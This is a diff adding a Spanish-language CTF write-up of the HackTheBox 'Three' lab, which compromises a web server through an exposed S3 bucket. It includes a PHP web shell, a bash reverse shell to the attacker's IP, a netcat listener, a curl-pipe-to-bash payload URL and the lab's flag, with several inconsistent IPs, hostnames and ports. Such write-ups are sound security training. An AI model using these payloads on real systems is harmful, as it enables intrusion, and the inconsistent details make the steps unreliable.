@@ -1,3 +1,106 @@
-# Nmap 7.93 scan initiated Thu Mar 30 23:14:33 2023 as: nmap -sVC -p- -T4 -Pn --open -oN tree 10.129.14.2
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Mar 30 23:28:08 2023 -- 1 IP address (1 host up) scanned in 815.76 seconds
+HTB-Lab trhee
+
+Escaneo de puertos
+nmap -sV 10.129.14.2
+-------
+Nmap scan report for 10.129.14.213
+Host is up (0.34s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+-------
+Puerto 80 es un servidor web 
+-------
+la ip nos lleva a una pagina web en donde podemos encontrar un mail de dominio "thetoppers.htb" Esto puede indicar que pueden haber mas dominios asociados a ese mail.
+-------
+luego de ver que la IP relacionada es una pagina web procedemos a utilizar "gobuster"
+dir -u http://10.129.14.213 -w usr/share/wordlists/dirb/big.txt
+Tambien se podria haber utilizado "wfuzz"
+-------
+el resultado es http://10.129.14.213/images/
+-------
+echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
+Aqui relacionamos el servidor con el dominio de forma local
+-------
+para saber si existen mas dominios asociados al mail anteriormente nombrado se utilizara gobuster nuevamente 
+sudo gobuster vhost -u http://thetoppers.htb -w subdomains-top1million-110000.txt
+-------
+el resultado es s3.thetoppers.htb
+-------
+Pasamos a relacionar ese subdominio con el servidor anterior
+echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+-------
+Al entrar en "s3.thetoppers.htb" nos figura un mensaje "{"status":"running"}"
+Ese mensaje significa que estamos corriendo el servidor s3
+-------
+luego para interactuar con el servidor deberemos utilizar "aws" (amazon web service)
+con los comandos
+> aws --endpoint-http://s3.thehoppers.htb s3 ls s3://thetoppers.htb
+
+	>--endpoint-http://s3.thehoppers.htb: Aqui especificamos el 		endpoint al que se conectara nuestro comando aws. En 		este caso es la web "s3.thehoppers.htb" 
+
+	>s3: Este comando indica que se trabajara con un servicio S3 		de amazon.
+
+	>ls: "ls" para enlistar el contenido
+
+	>s3://thetoppers.htb: Indicamos el nombre del bucket se 
+		especifica en formato de url, seguido del nombre de la
+		url.
+
+El contenido arrojado es el siguiente:
+	
+				PRE images/
+2023-04-14 17:37:30      	0 .htaccess
+2023-04-14 17:37:30      	11952 index.php
+------
+Pasaremos a inyectar codigo PHP en el servidor 
+
+> <?php system($_GET["cmd"]); ?>
+
+Este codigo permite enviar comandos a traves de la url y ejecutarlos en el servidor. 
+Paso a explicar en detalle los parametros del codigo.
+
+	> system(): Esta es una función de PHP que se utiliza para ejecutar comandos del sistema. En este caso, la función system() se utiliza para ejecutar un comando que se obtiene a través de la variable $_GET["cmd"].
+	
+	> $_GET: Esta es una variable predefinida en PHP que se utiliza para obtener datos que se envían a través de una petición HTTP GET. En este caso, la variable $_GET["cmd"] se utiliza para obtener un comando que se envía a través de la URL.
+
+	> "cmd": Este es el nombre del parámetro que se espera recibir a través de la URL.
+
+Procedemos a inyectar el codigo php en el servidor con el comando
+
+> aws --endpoint=http://s3.thetoppers.htb s3 cp Documents/code/tree.php s3://thetoppers.htb
+
+Ya usamos este comando antes, con la diferencia de que ahora usamos el comando "cp" que se utiliza para copiar objetos de una ubicacion a otra dentro del servidor s3
+-------
+Luego de inyectar el codigo php en el servidor aws procedemos a abrir nuestro servidor de python3 en el puerto 8000
+
+python3 -m http.server 8000
+-------
+Mediante la pagina "revshell.com" obtenemos el siguiente codigo para relacionar nuestra IP con el puerto elegido para hacer powershell inverso
+
+> sh -i >& /dev/tcp/----(mi ip)----/1337 0>&61
+
+En este caso se eligio el puerto 1337, Se habia elegido el 443 ya que es mas disuasorio al momento de enviar paquetes de datos. Como genero problemas se cambio a 1337.
+-------
+Como ultimo paso usaremos Ncat para poder manipular la consola inversa. El comando sera el siguiente
+
+> nc -nvlp 1337
+
+	• -n se utiliza para desactivar la resolucion de nombres 		de dominio en la direccion IP
+	• -v habilita la salida detallada y en un tiempo real de 		la para la sesion de comunicacion 
+	• -l indica que ncat tiene que esperar por una conexion 		entrante
+	• -p se utiliza para especificar en que puerto debe 		escuchar
+------
+ahora activamos el bypass entre servidor aws, servidor python tras nuestro puerto seleccionado
+
+> http://thetoppers.htb/tree.php?cmd=curl%20127.0.0.1
+:8080/shell.sh|bash
+------
+Esto hace que tomemos control mediante el codigo PHP del servidor aws mediante el servidor de python.
+Los comandos los enviamos a traves del puerto 1337 y recibimos la respuesta
+
+Mediante comandos como ls y cd llegamos a un archivo "flag.txt"
+
+flag: a980d99281a28d638ac68b9bf9453c2b
